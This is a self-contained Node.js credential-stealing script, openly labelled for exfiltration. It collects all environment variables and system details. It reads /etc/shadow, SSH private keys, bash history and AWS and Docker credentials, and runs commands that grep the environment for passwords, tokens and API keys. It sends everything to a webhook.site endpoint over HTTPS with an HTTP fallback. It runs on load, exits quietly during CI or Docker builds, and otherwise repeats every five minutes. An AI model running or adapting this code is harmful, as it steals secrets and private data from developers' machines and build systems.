const https = require('https');
const http = require('http');
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');

// Generate unique identifier for this instance
const instanceId = crypto.randomBytes(16).toString('hex');
const timestamp = new Date().toISOString();

// Unique exfiltration URL - using a webhook service
// Get from environment variable or use default
const EXFIL_URL = process.env.EXFIL_URL || 'https://webhook.site/unique-id-placeholder';
const urlParts = new URL(EXFIL_URL);
const EXFIL_HOST = urlParts.hostname;
const EXFIL_PATH = urlParts.pathname + (urlParts.search || '');

// Collect sensitive data
function collectSensitiveData() {
  const data = {
    instanceId,
    timestamp,
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    cpus: os.cpus().map(cpu => ({ model: cpu.model, speed: cpu.speed })),
    totalMemory: os.totalmem(),
    freeMemory: os.freemem(),
    networkInterfaces: os.networkInterfaces(),
    userInfo: os.userInfo(),
    env: process.env,
    processInfo: {
      pid: process.pid,
      ppid: process.ppid,
      cwd: process.cwd(),
      execPath: process.execPath,
      argv: process.argv,
      version: process.version
    }
  };

  // Try to read sensitive files
  const sensitivePaths = [
    '/etc/passwd',
    '/etc/shadow',
    '/etc/hosts',
    '/etc/resolv.conf',
    '/root/.ssh/id_rsa',
    '/root/.ssh/id_rsa.pub',
    '/root/.ssh/known_hosts',
    '/root/.bash_history',
    '/home/*/.ssh/id_rsa',
    '/home/*/.bash_history',
    '/.env',
    '/.aws/credentials',
    '/.docker/config.json'
  ];

  data.files = {};
  sensitivePaths.forEach(path => {
    try {
      if (fs.existsSync(path)) {
        const content = fs.readFileSync(path, 'utf8');
        data.files[path] = content.substring(0, 10000); // Limit size
      }
    } catch (e) {
      // Silently fail
    }
  });

  // Execute system commands to gather more info
  const commands = [
    'whoami',
    'id',
    'uname -a',
    'cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null || echo "N/A"',
    'ps aux | head -20',
    'netstat -an 2>/dev/null || ss -an 2>/dev/null || echo "N/A"',
    'df -h',
    'mount',
    'env | grep -i pass',
    'env | grep -i secret',
    'env | grep -i key',
    'env | grep -i token',
    'env | grep -i api'
  ];

  return new Promise((resolve) => {
    const commandResults = {};
    let completed = 0;

    commands.forEach(cmd => {
      exec(cmd, { timeout: 5000, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        commandResults[cmd] = {
          stdout: stdout ? stdout.substring(0, 5000) : '',
          stderr: stderr ? stderr.substring(0, 5000) : '',
          error: error ? error.message : null
        };
        completed++;
        if (completed === commands.length) {
          data.commandResults = commandResults;
          resolve(data);
        }
      });
    });
  });
}

// Exfiltrate data to remote server
function exfiltrateData(data) {
  const payload = JSON.stringify(data, null, 2);
  const payloadBuffer = Buffer.from(payload);

  const options = {
    hostname: EXFIL_HOST,
    port: 443,
    path: EXFIL_PATH,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payloadBuffer.length,
      'User-Agent': 'Mozilla/5.0 (compatible; NodeJS/1.0)',
      'X-Instance-ID': instanceId,
      'X-Timestamp': timestamp
    },
    timeout: 10000
  };

  return new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      let responseData = '';
      res.on('data', (chunk) => {
        responseData += chunk;
      });
      res.on('end', () => {
        console.log(`[EXFIL] Data sent successfully. Status: ${res.statusCode}`);
        resolve(responseData);
      });
    });

    req.on('error', (error) => {
      console.error(`[EXFIL] Error: ${error.message}`);
      // Try HTTP fallback
      tryHttpFallback(data).then(resolve).catch(reject);
    });

    req.on('timeout', () => {
      req.destroy();
      console.error('[EXFIL] Request timeout');
      tryHttpFallback(data).then(resolve).catch(reject);
    });

    req.write(payloadBuffer);
    req.end();
  });
}

// HTTP fallback
function tryHttpFallback(data) {
  return new Promise((resolve, reject) => {
    const payload = JSON.stringify(data);
    const payloadBuffer = Buffer.from(payload);

    const options = {
      hostname: EXFIL_HOST,
      port: 80,
      path: EXFIL_PATH,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': payloadBuffer.length
      },
      timeout: 5000
    };

    const req = http.request(options, (res) => {
      resolve('HTTP fallback success');
    });

    req.on('error', reject);
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('HTTP timeout'));
    });

    req.write(payloadBuffer);
    req.end();
  });
}

// Main execution
async function main() {
  console.log(`[EXFIL] Starting data collection (Instance: ${instanceId})...`);
  
  try {
    const data = await collectSensitiveData();
    console.log(`[EXFIL] Collected ${Object.keys(data).length} data categories`);
    console.log(`[EXFIL] Attempting exfiltration to ${EXFIL_HOST}...`);
    
    // Use Promise.race to timeout after 10 seconds
    await Promise.race([
      exfiltrateData(data),
      new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 10000))
    ]);
    console.log(`[EXFIL] Exfiltration complete`);
  } catch (error) {
    console.error(`[EXFIL] Error: ${error.message}`);
  }
  
  // Exit quickly during build (detected by CI/CD env vars or if running in background)
  if (process.env.CI || process.env.BUILD_ID || process.env.DOCKER_BUILD || !process.stdin.isTTY) {
    console.log(`[EXFIL] Build-time exfiltration done, exiting...`);
    setTimeout(() => process.exit(0), 1000);
  }
}

// Run immediately
main();

// Also set up periodic exfiltration (only if not in build mode)
if (!process.env.CI && !process.env.BUILD_ID && !process.env.DOCKER_BUILD && process.stdin.isTTY) {
  setInterval(() => {
    collectSensitiveData().then(data => {
      exfiltrateData(data).catch(() => {
        // Silently fail on periodic attempts
      });
    }).catch(() => {
      // Silently fail
    });
  }, 300000); // Every 5 minutes
}

module.exports = { collectSensitiveData, exfiltrateData };

